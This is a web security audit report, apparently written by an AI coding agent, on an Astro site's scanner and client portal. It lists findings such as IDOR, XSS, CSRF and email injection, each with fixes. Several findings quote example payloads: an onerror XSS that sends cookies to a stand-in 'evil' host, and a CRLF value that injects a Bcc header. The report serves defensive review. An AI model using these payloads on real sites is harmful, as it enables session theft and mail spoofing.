# Security audit 2026-05-12

Branch: seo-security-improvements (off strip-template-chrome-anchor)
Scope: server-side code and client-side auth/input handling. OWASP top 10 perspective plus modern web platform concerns.
Auditor: Claude Code (Opus 4.7, 1M context) sub-agent

## Summary

Total findings: 28 (critical: 2, high: 7, medium: 11, low: 6, info: 2)

Top themes:
- Lead-gate bypass on the public sentiment scanner (auto-incrementing scan IDs + a GET endpoint that returns full Tier 2 data with `unlocked:true`).
- Persistent fallback CSRF secret derived from another secret; CSRF tokens never bound to user identity.
- Multiple XSS sinks in portal scripts that build HTML by string concatenation from API JSON (listener, dashboard, health, keywords, notifications).
- IDOR on the notifications endpoint (any user can mark any notification read) and on the admin approval PUT (PR comment intends client access but checks neither contract membership nor admin role).
- Dependency advisories: 7 open (5 moderate, 2 high) including Astro <6.1.10 (XSS + CWE-323) and Vite <=7.3.1 (path traversal, fs.deny bypass, arbitrary file read).
- Privacy policy claims (no IP storage, log retention) are not enforced in code.

## Findings

### [SEC-001] Tier 2 sentiment report retrievable without unlock for any scan ID
**Severity**: critical
**OWASP category**: A01:2021 Broken Access Control / A04:2021 Insecure Design
**Files**: `src/pages/api/report.ts:7-68`, `src/lib/db.ts:35-41` (auto-increment id), `src/pages/listener.astro:642`
**Observation**: `GET /api/report?id=<int>` is unauthenticated, takes a numeric `scan_id`, returns `mentions`, `top_positive_phrases`, `top_negative_phrases`, `source_breakdown`, plus `unlocked: true` for any existing scan that has a non-null `overall_score`. `scans.id` is `INTEGER PRIMARY KEY AUTOINCREMENT` (migration 001), so IDs are sequential and trivially enumerable. The leads / unlock flow at `/api/unlock` is the intended gate, but `report.ts` does not check `leads` for a matching consent record.
**Attack scenario**: Anyone iterates `?id=1..N` and harvests every scan ever run, including brand identities, summaries, and all per-mention snippets and key phrases. The whole purpose of the email gate (lead capture) is bypassed.
**Recommendation**: Either require a token tied to a lead row (e.g. hash of `lead.id + scan.id + secret` issued only after consent and emailed in the link), or require `email` to be present in `leads` for that `scan_id` and gate `mentions / top_*phrases / source_breakdown` behind a signed param. At minimum, switch `scan.id` to nanoid (or include `signed_lookup_token TEXT UNIQUE` on scans, emailed in unlock).
**Effort**: medium
**Verification**: `curl https://codyasmith.com/api/report?id=1` should return only Tier 1 fields (or 401) unless a valid unlock token is supplied.

### [SEC-002] CSRF secret defaults to TURSO_AUTH_TOKEN and tokens are not bound to user identity
**Severity**: critical
**OWASP category**: A02:2021 Cryptographic Failures / A07:2021 Identification & Authentication Failures
**Files**: `src/lib/csrf.ts:9-30`
**Observation**: `getSecret()` falls back to `TURSO_AUTH_TOKEN`, then to the literal string `csrf-fallback-dev-only`. Reusing the Turso auth token as a CSRF HMAC key (a) cross-contaminates two unrelated secrets (rotation of one forces session-token invalidation) and (b) means anyone with read access to either env binding gains forging capability for both. The token also lacks user binding: payload is `sessionId:timestamp`, which is fine in isolation, but the secret is global. If a single session ID leaks via referrer or log, a forger can construct CSRF tokens for any user (since the secret is shared).
**Attack scenario**: Production deploys without `CSRF_SECRET` set will silently use `TURSO_AUTH_TOKEN`. Once that token rotates, all in-flight CSRF tokens invalidate. If `CSRF_SECRET` is left at the `csrf-fallback-dev-only` literal in production, attackers can forge CSRF tokens for any known session ID.
**Recommendation**: Require `CSRF_SECRET` (throw at startup if missing in production). Remove the `TURSO_AUTH_TOKEN` fallback. Document the secret in `.env.example`. Optionally bind tokens to `userId:sessionId:timestamp` for clearer rotation semantics.
**Effort**: trivial
**Verification**: Boot with both `CSRF_SECRET` and `TURSO_AUTH_TOKEN` unset and confirm startup fails fast in production mode.

### [SEC-003] IDOR: any user can mark any notification as read
**Severity**: high
**OWASP category**: A01:2021 Broken Access Control
**Files**: `src/pages/portal/api/notifications/index.ts:32-52`, `src/lib/notifications.ts:91-96`
**Observation**: `POST /portal/api/notifications` accepts `{ id }` and passes it straight to `markAsRead(id)`, which runs `UPDATE notifications SET read=1 WHERE id = ?` with no `user_id` predicate.
**Attack scenario**: Authenticated user A guesses or learns a notification ID belonging to user B and marks it read, hiding it from B's unread badge. With nanoid IDs this is mostly nuisance, but it tampers with another user's audit/notification state and could mask incident notifications (e.g. payment_received, approval_requested).
**Recommendation**: Add `AND user_id = ?` to `markAsRead`, pass `locals.user.id`. Same for any future `deleteNotification` callers.
**Effort**: trivial
**Verification**: Authenticated cross-user POST to `/portal/api/notifications` with another user's notification ID should 404 or 403.

### [SEC-004] IDOR: admin approval PUT endpoint allows any authenticated user to respond
**Severity**: high
**OWASP category**: A01:2021 Broken Access Control
**Files**: `src/pages/portal/api/admin/approvals/[id].ts:26-64`
**Observation**: The PUT handler comment says "Approvals can be responded to by admin or the client user" but the gate is only `if (!locals.user)`. There is no check that the requester is either an admin or a client user belonging to the contract's client. Any authenticated client can approve or reject any approval in the system, including approvals for other clients' contracts.
**Attack scenario**: Client A's portal user calls `PUT /portal/api/admin/approvals/<known-or-guessed-id>` with `{ status: "approved" }`. The approval for Client B's contract is now marked approved by Client A's user, and `onApprovalResponded` triggers cascading effects (notifications, milestone unlocks, billing).
**Recommendation**: Either require `locals.user.role === 'admin'` (and let `/portal/api/client/approvals` be the client-only path it already is), or load the approval's contract and verify `contract.client_id === locals.user.client_id` for non-admin users. Mirror the pattern in `src/pages/portal/api/client/approvals.ts:55-61`.
**Effort**: small
**Verification**: As Client A (different client_id from approval's contract), PUT should return 403.

### [SEC-005] XSS in listener report rendering (mentionCard, source bars, source detail, recommendation services)
**Severity**: high
**OWASP category**: A03:2021 Injection
**Files**: `src/pages/listener.astro:330-338, 386, 389-411, 454-475`
**Observation**: `mentionCard` and several inline templates interpolate API JSON into `innerHTML` without escaping: `m.source_name`, `m.source_type`, `m.url`, `m.snippet`, `m.key_phrases` items, `s.name`, `s.why`, `s.url`. These fields are derived from arbitrary third-party web pages via `scrapeAll` and stored in `mentions.snippet / source_name / key_phrases`. Cheerio output is HTML-stripped in many places but JSON-stringified key phrases are not.
**Attack scenario**: Attacker publishes a page or social post crafted to be returned by Serper for a target brand. The scraped snippet or source_name contains `<img src=x onerror=...>`. When any visitor unlocks a report for that brand, JS runs in the visitor's browser scoped to codyasmith.com (no CSP nonce, `script-src 'unsafe-inline'`).
**Recommendation**: Replace string-concatenation HTML construction with `document.createElement` + `.textContent`, or run user-controlled strings through a tiny `escapeHtml` helper before interpolation (the contact endpoint already has one). Same pattern in `src/lib/funnel-emails.ts`. Audit every `innerHTML +=` and `${...}` in HTML template literals across the listener.
**Effort**: medium
**Verification**: Submit a brand whose Serper results contain an XSS payload; confirm rendered output shows the literal string.

### [SEC-006] XSS in portal dashboard / health / keywords / notifications via innerHTML of API data
**Severity**: high
**OWASP category**: A03:2021 Injection
**Files**: `src/pages/portal/dashboard.astro:292-326` (keyword, url), `src/pages/portal/health.astro:188-220` (issue_name, description, how_to_fix), `src/pages/portal/keywords.astro:208-235` (keyword, url), `src/pages/portal/notifications.astro:51-62` (title, body), `src/pages/portal/admin/notifications.astro:63-75`
**Observation**: Each of these scripts builds HTML by concatenating string templates with values pulled from API responses. The underlying fields come from CSV uploads (`issue_name`, `description`, `how_to_fix`, `keyword`, `url`) or from system-generated notifications whose `body` may include user names and titles. None are escaped before injection.
**Attack scenario**: A malicious or sloppy CSV ingest plants `<img src=x onerror=fetch('https://evil/'+document.cookie)>` in `site_issues.issue_name`. (Cookie is httpOnly so it would not exfil session, but the script can still call `/portal/api/...` with CSRF token read from the meta tag and perform any action as the viewing user, including admin actions if an admin views the page.) Same for notification body when an attacker can influence the body (e.g. through approval title which a future endpoint may let clients write).
**Recommendation**: Adopt a shared `escapeHtml` and apply at every interpolation point in `.innerHTML` templates, or refactor these blocks to use `createElement` + `textContent`. Tighten CSP to remove `'unsafe-inline'` for `script-src` (use nonces) so DOM-injected scripts cannot execute.
**Effort**: medium
**Verification**: Upload a CSV with an HTML payload in an issue name; navigate to /portal/health and confirm the payload renders as text.

### [SEC-007] Email HTML injection / header injection on Brevo subjects and bodies
**Severity**: high
**OWASP category**: A03:2021 Injection
**Files**: `src/pages/api/unlock.ts:90, 94, 101`, `src/pages/api/quiz.ts:60-68`, `src/pages/api/contact.ts:66`, `src/pages/portal/api/admin/create-user.ts:66-78`, `src/pages/portal/auth/send-link.ts:61`, `src/lib/billing.ts:313-328`
**Observation**: `unlock.ts` interpolates `scan.brand`, `scan.summary`, `scan.overall_score`, `scan.overall_label` directly into the email HTML body and the subject line. `scan.brand` originates from the public scan form (`POST /api/scan`, parsed via `parseInput`). `quiz.ts` and `contact.ts` interpolate `name`, `email`, `interestList`, `quizTheme` into HTML and the subject line; only the body is HTML-escaped, not the subject. `create-user.ts` interpolates `name.trim().split(' ')[0]` into the email HTML without escape. `send-link.ts` interpolates `user.name.split(' ')[0]` and `loginUrl` (token embedded) likewise.
**Attack scenario**: An attacker submits `brand = "Foo\r\nBcc: leak@evil.com"` to the scan form. While Brevo's JSON API is unlikely to honor CRLF in a JSON string body, `subject: ` is interpolated and could carry stored HTML to the lead inbox. More realistically, an attacker submits brand = `<script>...</script>` and the recipient (the scan submitter) sees the payload rendered in their email client (limited by client sandboxing but enough for phishing-grade content injection like a fake unsubscribe link or click-through). On unlock.ts the subject also receives unsanitized brand which could spoof other From: like headers in mail clients.
**Recommendation**: HTML-escape every user-supplied value before embedding in `htmlContent`. Strip CRLF (`\r\n`) from values used in `subject`. The `escapeHtml` helper already exists in funnel-emails.ts and several routes; centralize and call it everywhere. Best practice: prefer Brevo template IDs with placeholders so values never touch HTML strings.
**Effort**: small
**Verification**: Submit a scan with brand containing `<script>alert(1)</script>` and a CRLF; confirm escaped output in delivered email source.

### [SEC-008] CSRF protection bypassed on `/portal/auth/logout` because auth routes are exempt
**Severity**: high
**OWASP category**: A01:2021 Broken Access Control
**Files**: `src/middleware.ts:60-65`, `src/pages/portal/auth/logout.ts:7-28`, `src/layouts/Portal.astro:134, 192`
**Observation**: Middleware exits with `next()` for all `/portal/auth/*` routes before reaching the CSRF check. Logout is a state-changing POST that destroys the user's session. The logout form does not include a CSRF token. Origin check via `astro.config.mjs` (`security.checkOrigin: true`) is the only barrier, but it only validates non-GET requests for form submissions on Astro-rendered routes; for plain `<form method="POST" action="/portal/auth/logout">` the browser will send the origin header by default and Astro's origin check passes if the origin equals `Astro.url.origin`, so a CSRF from a third-party site posting an HTML form to `/portal/auth/logout` would have a different origin and be blocked. The risk is therefore low but the inconsistency is real: every other portal POST requires both origin and CSRF token, logout requires only origin.
**Attack scenario**: An attacker tricks a logged-in user into visiting an attacker-controlled page that auto-submits a form to `https://codyasmith.com/portal/auth/logout`. Astro's `checkOrigin` should reject this since the origin header is the attacker's domain, but Astro's checkOrigin is documented as covering same-origin form submissions, not all cross-origin POSTs. If the Origin header is missing (no-referrer-when-downgrade contexts), the request may pass. Result: unwanted logout (low-impact denial of service).
**Recommendation**: Either (a) extend middleware CSRF validation to all state-changing portal requests including `/portal/auth/logout`, or (b) make logout an idempotent DELETE that requires CSRF header. Move CSRF check above the auth-route exemption for POST/PUT/PATCH/DELETE.
**Effort**: small
**Verification**: Cross-origin POST to /portal/auth/logout from a different domain should return 403.

### [SEC-009] Magic link still active in code, returns success even when password is set
**Severity**: medium
**OWASP category**: A07:2021 Identification & Authentication Failures
**Files**: `src/lib/auth.ts:172-217`, `src/pages/portal/auth/send-link.ts:1-89`, `src/pages/portal/auth/verify.ts:1-40`, `src/pages/portal/api/admin/create-user.ts:47-87`
**Observation**: Even though login was converted to password-based per the user-supplied context, magic-link issuance (`/portal/auth/send-link` POST) and verification (`/portal/auth/verify` GET) are still wired up and fully functional. `createMagicLink` + `validateMagicLink` enforce single-use and 15-minute expiry, which is good. But the magic link bypasses the password entirely: anyone who triggers `send-link` for any registered email gets a 15-minute login link by email. Combined with the timing-safe response on `send-link` (always returns ok), this is an alternate auth path with weaker guarantees (relies entirely on email account integrity).
**Attack scenario**: An attacker compromises a user's email or intercepts the inbox in the 15-minute window and uses the magic link to bypass the password. Account lockout via password (or password manager protections) is moot. Also, admin-side `create-user` emails a magic link by default (`send_invite`), which is required for onboarding but conflates onboarding with steady-state auth.
**Recommendation**: If password auth is the canonical path, either disable magic-link send for users who already have a password set (check `password_hash IS NOT NULL`), or repurpose magic links as a password-reset/initial-set flow (link lands on a set-password page, not auto-logs in). Document the policy.
**Effort**: small
**Verification**: For a user with a password set, POST to `/portal/auth/send-link` should not send a usable login link.

### [SEC-010] No password complexity or breached-password check on `setPassword`
**Severity**: medium
**OWASP category**: A07:2021 Identification & Authentication Failures
**Files**: `src/lib/auth.ts:57-63`, `src/pages/portal/api/admin/set-password.ts:11-34`
**Observation**: `setPassword` accepts any string. The admin endpoint requires `length >= 8`. There is no upper bound (bcrypt has a 72-byte limit; longer inputs silently truncate), no complexity rule, no breached-password check (e.g. HaveIBeenPwned k-anonymity), no rejection of common passwords.
**Attack scenario**: An admin (or a self-service password-set flow if added later) accepts `password = "password"` or `"12345678"`. Account is brute-forceable within seconds since rate limit is 10 logins per 15 min per IP only (not per account).
**Recommendation**: Enforce minimum length 12, reject the top 10k breached passwords (or any list), and cap input length at 72 chars (or hash with SHA-256 first then bcrypt). Add per-account login attempt throttling (counter on users table or a separate `login_attempts` table) so per-IP throttling cannot be sidestepped via a botnet.
**Effort**: medium
**Verification**: POST `password: "12345678"` to `/portal/api/admin/set-password` and confirm rejection.

### [SEC-011] No per-account login throttling; per-IP only
**Severity**: medium
**OWASP category**: A07:2021 Identification & Authentication Failures
**Files**: `src/pages/portal/auth/login.ts:13-16`, `src/lib/rate-limit.ts`
**Observation**: `rateLimit('login:${ip}', 10, 15 * 60 * 1000)` is per-IP. An attacker rotating IPs (botnet, residential proxies) can brute-force a target account indefinitely. The rate-limit also fails open on any DB error (`return true`).
**Attack scenario**: Distributed credential-stuffing run hits a specific known admin email from 1000 different IPs at 10 attempts each. Bcrypt cost 12 slows it but does not stop it.
**Recommendation**: Add a second rate limit keyed by lowercased email (`login:email:${email}`) and a per-account lockout (e.g. after 10 failed attempts in 10 min, lock for 15 min with notification). Consider fail-closed for login specifically: if rate-limit lookup fails, reject the request rather than allow it.
**Effort**: small
**Verification**: Submit 11 failed logins for the same email from 11 different IPs and observe lockout.

### [SEC-012] CSP allows `'unsafe-inline'` for scripts and styles
**Severity**: medium
**OWASP category**: A05:2021 Security Misconfiguration
**Files**: `src/middleware.ts:27-35`, `scripts/postbuild-security-headers.mjs:36`
**Observation**: Both the middleware CSP and the postbuild wrapper CSP use `script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net`. `'unsafe-inline'` neutralizes CSP's primary XSS defense. Astro inlines a small bootstrap script in Base.astro (`<script is:inline>`) and several pages have `define:vars` blocks; these are unavoidable without nonces.
**Attack scenario**: Combined with SEC-005 and SEC-006, an attacker who lands an HTML payload through scraped sentiment data or notifications can execute arbitrary JS. A nonce-based CSP would block this even if the payload reaches the DOM.
**Recommendation**: Migrate to nonce-based CSP. Astro 5+ supports CSP nonces via `@astrojs/internal-helpers` and middleware that injects a per-response nonce attribute on internal script tags. Alternative: compute SHA-256 hashes of the small `is:inline` block in Base.astro and add to `script-src`. Remove `'unsafe-inline'` from `style-src` if Tailwind utility classes are sufficient (Astro inlines minimal CSS).
**Effort**: large
**Verification**: Inspect the response Content-Security-Policy header and confirm no `'unsafe-inline'` for script-src in production.

### [SEC-013] CSP `connect-src 'self'` blocks Gemini and Serper calls only if called from the browser, but Brevo/Gemini calls from the server are unaffected (info-level)
**Severity**: low
**OWASP category**: A05:2021 Security Misconfiguration
**Files**: `src/middleware.ts:33`
**Observation**: This is fine since the listener calls `/api/scan` (same origin) which then calls Serper/Gemini server-side. Worth noting for future SSE/streaming features.
**Recommendation**: Document the intent. If browser-side calls to third-party APIs are ever added (Stripe.js, Mapbox), update `connect-src` accordingly.
**Effort**: trivial
**Verification**: n/a

### [SEC-014] Session cookie not scoped tightly; SameSite=lax acceptable but could be strict
**Severity**: low
**OWASP category**: A07:2021 Identification & Authentication Failures
**Files**: `src/pages/portal/auth/login.ts:40-46`, `src/pages/portal/auth/verify.ts:31-37`
**Observation**: `path: '/portal'`, `secure: true`, `httpOnly: true`, `sameSite: 'lax'`, `maxAge: 30 days`. Lax allows top-level GET cross-site navigation to /portal/* with cookie attached (e.g. attacker links to `/portal/dashboard` from another site, browser sends cookie). For a portal that's an admin/client area with no inbound deep-link use case, `sameSite: 'strict'` would be a small UX hit (no auto-login from third-party links to /portal/*) but more secure. There's also no session rotation on privilege change.
**Attack scenario**: Limited; primarily relevant if there were CSRF gaps or open redirects.
**Recommendation**: Consider `sameSite: 'strict'`. Rotate session token (delete old + create new) on role change or password change. The login flow already creates a new session at each login, but `setPassword` should also revoke existing sessions (currently it doesn't).
**Effort**: small
**Verification**: After admin sets a new password for a user, all of that user's existing sessions should be invalidated.

### [SEC-015] Session refresh keeps session alive indefinitely as long as activity continues
**Severity**: low
**OWASP category**: A07:2021 Identification & Authentication Failures
**Files**: `src/lib/auth.ts:8-9, 116-148`
**Observation**: Session TTL is 30 days. If within 15 days of expiry, the session is extended back to 30 days. Active users never logout. There is no absolute maximum lifetime, no idle timeout shorter than the rolling window, and no "issued_at" tracking, so an attacker who steals a session token early can keep it valid forever.
**Recommendation**: Add an absolute maximum session lifetime (e.g. 90 days from `created_at`, even with refresh). Track `created_at` on the sessions table (already present per schema in 001-initial-schema.ts line 33). Add a max-age check alongside the expires_at check.
**Effort**: small
**Verification**: Create a session, advance `created_at` to >90 days, confirm validateSession rejects.

### [SEC-016] Rate limit fails open and uses minute-level cleanup that scans all rows
**Severity**: medium
**OWASP category**: A05:2021 Security Misconfiguration
**Files**: `src/lib/rate-limit.ts:14-56`
**Observation**: On any DB error the rate-limit returns `true` (allow). Cleanup of expired windows runs on every call (`DELETE FROM portal_rate_limits WHERE window_start < ?`). Under load this is a wasteful full-table delete on every request and the fail-open semantics mean a Turso outage opens the auth endpoints to unlimited brute force. The legacy `rate_limits` table (db.ts) is even simpler (per-day count, no cleanup).
**Attack scenario**: Attacker exploits a transient DB error window (e.g. during a Turso replica reshuffle) to brute-force login at full speed.
**Recommendation**: Move cleanup to a separate periodic job (or piggyback once per N requests, not every request). On DB error for login routes specifically, fail closed. Document the fail-open posture per-endpoint.
**Effort**: small
**Verification**: Simulate a Turso error and verify login is throttled (rejected) instead of allowed.

### [SEC-017] `/portal/api/files/download` is GET, redirects to a signed S3 URL with no per-request CSRF protection
**Severity**: low
**OWASP category**: A05:2021 Security Misconfiguration
**Files**: `src/pages/portal/api/files/download.ts:6-29`
**Observation**: Authorization check is correct (admin or owning client). However, the GET signed URL redirect means an attacker who can get the browser to visit `/portal/api/files/download?id=X` (e.g. via an `<img>` tag or a link from a less-trusted page in the same origin) will get the file. Authorization check is sound, so the only risk is the user themselves downloading something they're already permitted to access. The signed URL has 1-hour TTL which is reasonable.
**Attack scenario**: Limited. If an XSS bug is found elsewhere on /portal, the attacker could enumerate files and exfiltrate the signed URLs.
**Recommendation**: Consider adding a short rate limit per session on the download endpoint (e.g. 100 downloads per hour). Set `Referrer-Policy: no-referrer` on the 302 response specifically so the signed URL is not leaked via Referer to S3 (S3 reads the signature from the query string; downstream pages on S3 wouldn't normally leak it, but defense in depth).
**Effort**: trivial
**Verification**: Make 200 GET requests in one hour from one session, confirm rejection beyond the threshold.

### [SEC-018] File uploads accept browser-declared MIME type; no magic-byte verification
**Severity**: medium
**OWASP category**: A04:2021 Insecure Design
**Files**: `src/lib/storage.ts:30-71`, `src/pages/portal/api/files/upload.ts:12-66`
**Observation**: `ALLOWED_TYPES` is checked against `file.type` (the browser's declared MIME, attacker-controllable in formdata) rather than against magic bytes. The extension is taken verbatim from the original filename and appended to the nanoid (`${nanoid(12)}.${ext}`), but the file is stored in DO Spaces with `ContentType: mimeType` so S3 will serve back whatever MIME the client claimed. Storage is admin-only, so the impact is limited.
**Attack scenario**: A compromised admin account uploads a file with `Content-Type: image/png` but actual content being an HTML file with JS, served by S3 to a client. Since downloads go through a signed URL redirect, the browser renders S3's content type. If a client clicks the link they execute attacker JS on s3.amazonaws.com origin (sandboxed but enough for phishing).
**Recommendation**: Validate file by magic bytes (e.g. file-type library, or simple PDF/JPEG/PNG/WEBP header checks). Strip the original extension from the rendered filename or set `Content-Disposition: attachment` on the S3 upload (`ContentDisposition: 'attachment; filename="..."'` in PutObjectCommand). The download endpoint should also force-attachment.
**Effort**: small
**Verification**: Upload a file with mismatched declared MIME and actual content, confirm rejection.

### [SEC-019] CSV upload size cap is 10MB but no row count cap, and parsers run synchronously in request
**Severity**: low
**OWASP category**: A05:2021 Security Misconfiguration
**Files**: `src/pages/portal/api/csv/upload.ts:11-64`, `src/lib/csv/index.ts`
**Observation**: A 10MB CSV can contain hundreds of thousands of rows; parser inserts row-by-row inside the request handler (no batching, no streaming insert). Long-running uploads tie up a request slot. Acceptable for an admin-only feature but a DoS vector if admin auth ever weakens.
**Recommendation**: Add a row-count cap, run parsing in a worker / queue, or use Turso `batch` to insert in chunks.
**Effort**: medium
**Verification**: Upload a 10MB CSV with 1M rows, observe response time.

### [SEC-020] No automatic cleanup of `rate_limits` or `request_log` tables; privacy policy claims retention enforcement
**Severity**: medium
**OWASP category**: A04:2021 Insecure Design / A01 (privacy)
**Files**: `src/lib/db.ts:117-141` (rate_limits stores IPs indefinitely), `src/lib/request-log.ts`, `src/pages/privacy.astro:39, 69`
**Observation**: Privacy page says "No IP address is stored" for request logs (true) and "My target retention is 90 days; I delete older logs periodically." There is no code that deletes request_log rows older than 90 days. The `rate_limits` table (used by /api/scan) stores raw IPs with `scan_date` as the only TTL signal, and there is no cleanup. The privacy policy implies user data is deletable on request; that's a manual process not enforced in code.
**Attack scenario**: Compliance / privacy claim is unsupported. If pressed, the operator cannot show retention enforcement and IPs accumulate forever.
**Recommendation**: Add a migration with `CREATE INDEX IF NOT EXISTS idx_rate_limits_date ON rate_limits(scan_date)` and a periodic cleanup job (`DELETE FROM rate_limits WHERE scan_date < date('now','-30 day')`). Same for `request_log` at 90 days. Either run from middleware (every N requests) or a separate scheduled script. Document the actual retention.
**Effort**: small
**Verification**: Insert rows with old timestamps, run cleanup, verify removal.

### [SEC-021] Astro server-side checkOrigin only covers Astro-managed POSTs; verify it covers /portal/api routes
**Severity**: info
**OWASP category**: A05:2021 Security Misconfiguration
**Files**: `astro.config.mjs:18-20`
**Observation**: `security.checkOrigin: true` is enabled, which rejects POST requests whose Origin doesn't match the expected host. Combined with HMAC CSRF token, this is defense in depth. Confirm it applies to all `/portal/api/*` POSTs including multipart/form-data uploads (Astro's docs note formdata works).
**Recommendation**: Add an integration test that posts to `/portal/api/admin/contracts` with `Origin: https://evil` and confirms 403 before the CSRF check fires.
**Effort**: small
**Verification**: Run the integration test.

### [SEC-022] Dependency vulnerabilities (npm audit): 7 open, 2 high, 5 moderate
**Severity**: high
**OWASP category**: A06:2021 Vulnerable & Outdated Components
**Files**: `package.json`, `package-lock.json`
**Observation**: `npm audit` reports:
- `astro` <6.1.10: XSS in define:vars (GHSA-j687-52p2-xcff, moderate, CVSS 6.1) and server island encrypted parameters cross-component replay (GHSA-xr5h-phrj-8vxv, low, CWE-323). Both fixed in 6.1.10+.
- `@astrojs/node` <10.0.5: Cache poisoning from malformed if-match header (GHSA-c57f-mm3j-27q9, moderate, CVSS 5.3).
- `vite` 7.0.0..7.3.1: Path traversal in `.map` (GHSA-4w7w-66w2-5vf9), `server.fs.deny` bypass with queries (GHSA-v2wj-q39q-566r, high), arbitrary file read via dev-server websocket (GHSA-p9ff-h696-f583, high). Vite is a dev-time dependency, but the dev server is sometimes exposed during development.
- `postcss` <8.5.10: XSS via unescaped `</style>` in stringify output (GHSA-qx2v-qp2m-jg93, moderate, CVSS 6.1).
- `fast-xml-parser` <5.7.0 and `fast-xml-builder` <=1.1.6: XML injection / CDATA escape issues (GHSA-gh4j-gqv2-49f6 moderate; GHSA-5wm8-gmm8-39j9 high). Both transitive via `@aws-sdk/xml-builder` used by `@aws-sdk/client-s3`.
- `@aws-sdk/xml-builder` 3.894.0..3.972.18: moderate via fast-xml-parser.

All have available fixes per `fixAvailable: true`.
**Attack scenario**: The Astro define:vars XSS is directly relevant: several portal pages pass IDs through define:vars; if any of those values ever become user-controlled, this is exploitable. The Vite advisories matter only in dev mode but a developer running `npm run dev` on a network shared with attackers (e.g. coffee shop wifi) could be compromised.
**Recommendation**: Run `npm audit fix` and verify; if it touches a major version, do it in a separate PR and run the test suite. At minimum bump astro to 6.1.10+ and @astrojs/node to 10.0.5+ before next deploy.
**Effort**: small
**Verification**: `npm audit` returns 0 vulnerabilities.

### [SEC-023] Open redirect surface on `/portal/login?error=` is parameter-only and safe; check elsewhere
**Severity**: info
**OWASP category**: A01:2021 Broken Access Control
**Files**: `src/pages/portal/login.astro:93-100`, `src/middleware.ts:69-76, 108-110, 113-115`
**Observation**: The `?error=` param is matched against a hardcoded list (`expired`, `inactive`) and only affects displayed text. No URL parameter is ever used in a redirect destination. Middleware redirects to fixed paths (`/portal/login`, `/portal/dashboard`). No open-redirect surface found.
**Recommendation**: None; flagged as cleared.
**Effort**: trivial
**Verification**: n/a

### [SEC-024] Scan endpoint emits stack-like error messages back to clients
**Severity**: low
**OWASP category**: A05:2021 Security Misconfiguration
**Files**: `src/pages/api/scan.ts:152, 169`, `src/pages/api/unlock.ts:72-73`
**Observation**: In SSE error events the endpoint returns `err.message || 'Scan failed'`. Errors from Serper, Gemini, the scraper, and DB ops bubble up unfiltered. `unlock.ts` returns `err.message || 'Failed to unlock report'`. These could include API endpoint URLs, internal field names, or upstream provider error bodies.
**Attack scenario**: Reconnaissance / fingerprinting of internals.
**Recommendation**: Map known error categories to user-facing messages (`'Search timed out'`, `'Brand not found'`, etc.) and log the original error server-side. Never echo `err.message` directly except for explicitly-thrown validation errors.
**Effort**: small
**Verification**: Trigger an error condition (e.g. invalid Serper key) and confirm the client sees only a generic message.

### [SEC-025] Activity log not tamper-evident; admin can edit/delete via Turso console
**Severity**: low
**OWASP category**: A09:2021 Security Logging & Monitoring Failures
**Files**: `src/lib/activity.ts`, `src/lib/migrations/003-activity-log.ts`
**Observation**: Activity log is an append helper (no `UPDATE`/`DELETE` exposed via API), which is good. There is no integrity hash chain or cryptographic anchoring. Anyone with DB access (Turso credentials) can rewrite the log silently. For a single-operator portal this is acceptable; for a multi-tenant SaaS it would not be.
**Recommendation**: For future hardening, add `prev_hash` column and chain entries (each entry's hash = sha256(prev_hash + content)). Alternatively, periodically export the log to an append-only store.
**Effort**: medium
**Verification**: Document the integrity model in `docs/security.md`.

### [SEC-026] Subresource integrity missing on Google Fonts and cdn.jsdelivr
**Severity**: low
**OWASP category**: A08:2021 Software & Data Integrity Failures
**Files**: `src/layouts/Base.astro:52`, `src/layouts/Portal.astro:71`, `src/pages/portal/login.astro:24`
**Observation**: External CSS from `fonts.googleapis.com` is loaded without SRI. CDN scripts from `cdn.jsdelivr.net` (per CSP allowance) similarly. Google Fonts uses content-derived URLs but is a well-known SRI footgun (the URL points at versioned CSS that returns different content depending on user-agent / locale). For privacy and integrity, consider self-hosting the fonts.
**Recommendation**: Self-host the small set of font weights actually used. Drop the `https://cdn.jsdelivr.net` entries from CSP if Chart.js is loaded via a bundle (or pin the version + SRI hash if loaded via CDN).
**Effort**: medium
**Verification**: Inspect HTML: no external `<link rel="stylesheet">` or `<script src="https://cdn.jsdelivr.net/...">` without `integrity=`.

### [SEC-027] No `.env.example` file documents required secrets
**Severity**: low
**OWASP category**: A05:2021 Security Misconfiguration
**Files**: project root (no `.env.example` present)
**Observation**: Required environment variables (CSRF_SECRET, TURSO_DATABASE_URL, TURSO_AUTH_TOKEN, BREVO_API_KEY, SERPER_API_KEY, GEMINI_API_KEY, DO_SPACES_ENDPOINT, DO_SPACES_REGION, DO_SPACES_KEY, DO_SPACES_SECRET, DO_SPACES_BUCKET, STORAGE_KEY_PREFIX, SITE) are not documented anywhere. Developers must read source to discover them. Onboarding risk plus risk of forgotten secret (CSRF_SECRET) silently falling back to TURSO_AUTH_TOKEN (SEC-002).
**Recommendation**: Add `.env.example` with all keys and placeholder values (no real credentials). Add `.env.example` to `.gitignore` exception (i.e. ensure it's tracked).
**Effort**: trivial
**Verification**: New developer can `cp .env.example .env` and boot.

### [SEC-028] SSE scan endpoint not bounded by time; expensive operations could be abused
**Severity**: low
**OWASP category**: A04:2021 Insecure Design
**Files**: `src/pages/api/scan.ts:71-156`, `src/lib/sentiment-gemini.ts`
**Observation**: A single scan triggers up to 4 Serper queries, 20 page scrapes, and 20 Gemini calls (per mention). Per-IP rate limit is 3 scans/day, global cap is 1800/month. Time bound is implicit: the request stays open until completion. A malicious actor with 100 IPs could trigger ~300 scans/day pre-cap. Serper + Gemini both cost money.
**Recommendation**: Add per-IP rate limit at /api/scan calls per hour (e.g. 1/hour) in addition to per-day. Add a global concurrent-scans cap (e.g. max 3 simultaneous). Add per-stage timeout enforcement (scan should abort if > 60s elapsed). Track per-scan cost server-side.
**Effort**: medium
**Verification**: Run a load test from one IP at 3/day cap, confirm hourly throttle catches faster bursts.

## Strengths

- SQL queries throughout use parameterized statements via `turso.execute({ sql, args })`. Dynamic table/column names go through `UPDATABLE_COLUMNS` allowlists in `contracts.ts` and `invoices.ts`. No string concatenation of user input into SQL was found.
- Password hashing is bcryptjs with cost 12; legacy SHA-256 hashes are silently upgraded on next login. Session tokens are `nanoid(40)` (CSPRNG) and stored as SHA-256 hashes in the DB.
- CSRF tokens are HMAC-bound to session ID with constant-time comparison and 1-hour validity.
- Origin verification is enabled via `astro.config.mjs security.checkOrigin: true`.
- Middleware enforces session, body size cap (1MB), CSRF on portal API state changes, client-active check, and admin-vs-client route segregation.
